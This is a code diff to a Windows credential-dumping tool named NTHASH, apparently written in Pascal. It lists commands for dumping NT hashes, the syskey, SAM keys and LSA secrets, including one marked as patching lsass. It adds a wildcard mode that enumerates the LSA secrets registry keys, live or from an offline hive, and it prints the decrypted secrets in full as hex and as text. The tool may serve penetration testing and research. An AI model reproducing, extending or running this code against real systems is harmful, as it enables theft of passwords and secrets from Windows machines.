@@ -969,7 +969,8 @@ begin
   log('NTHASH /dumphash /rid:500 [/offline]',1); //will patch lsasss
   log('NTHASH /getsyskey [/offline]',1);
   log('NTHASH /getsamkey [/offline]',1);
-  log('NTHASH /dumpsecret /input:secret [/offline]',1);
+  log('NTHASH /dumpsecret /input:* [/offline]',1);
+  log('NTHASH /dumpsecret /input:a_secret [/offline]',1);
   log('NTHASH /dumpsecret /input:dpapi_system [/offline]',1);
   log('NTHASH /getlsakeys',1); //will read mem
   log('NTHASH /wdigest',1);  //will read mem
@@ -1679,6 +1680,13 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      if input='' then exit;
+     if input='*' then
+        begin
+        if offline
+           then MyOrEnumKeys ('security.sav','Policy\secrets')
+           else MyRegEnumKeys (HKEY_LOCAL_MACHINE ,'Security\Policy\secrets');
+        exit;
+        end;
      if getsyskey(syskey)=false then begin log('getsyskey NOT OK',1);exit; end;
      //
      if dumpsecret(syskey,input,output_,'currval') then
@@ -1748,7 +1756,12 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
                 if lowercase(mode)='machine' then log(ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
                 if lowercase(mode)='user' then log(ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
                 end
-         else log('secret:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+         else
+         begin
+         log('secret:'+ByteToHexaString (@output_ [0],length(output_)),1);
+         log('secret:'+BytetoAnsiString  (@output_ [0],length(output_)),1);
+         //log('secret:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+         end;
         end;
      goto fin;
      end;
